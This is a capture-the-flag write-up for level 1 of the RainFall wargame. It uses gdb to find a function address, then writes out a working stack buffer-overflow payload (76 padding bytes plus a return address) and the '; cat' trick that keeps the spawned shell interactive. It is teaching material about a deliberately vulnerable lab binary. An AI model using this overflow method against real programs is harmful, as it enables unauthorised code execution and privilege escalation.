<h1 align="center"> LEVEL 1 </h1>

## 🔍 Analysis of Decompiled [level1](./source.c)
get the addr of the run:
```
level1@RainFall:~$ gdb ./level1
(gdb) info func run
All functions matching regular expression "run":

Non-debugging symbols:
0x08048444  run
```
 so the addr of the run function : `0x08048444`

## 💥 Exploit  
```sh
level1@RainFall:~$ (python -c 'print("A"*76 + "\x44\x84\x04\x08")') | ./level1
Good... Wait what?
Segmentation fault (core dumped)

```
The payload is sent into ./level1’s stdin.

But once Python finishes printing, EOF (end-of-file) is reached on stdin.

So when your exploit works and /bin/sh is spawned, the shell immediately sees EOF on its input and exits right away — you don’t get to interact with it.

the fix is `; cat`
```sh
level1@RainFall:~$ (python -c 'print("A"*76 + "\x44\x84\x04\x08")' ; cat) | ./level1
Good... Wait what?
whoami
level2
```
- First, Python prints your payload (overflow + return address).

- Then, cat continues running and forwards your keyboard input into the process.

- Now, when /bin/sh spawns, it still has a live stdin to read from — so you get an interactive shell.
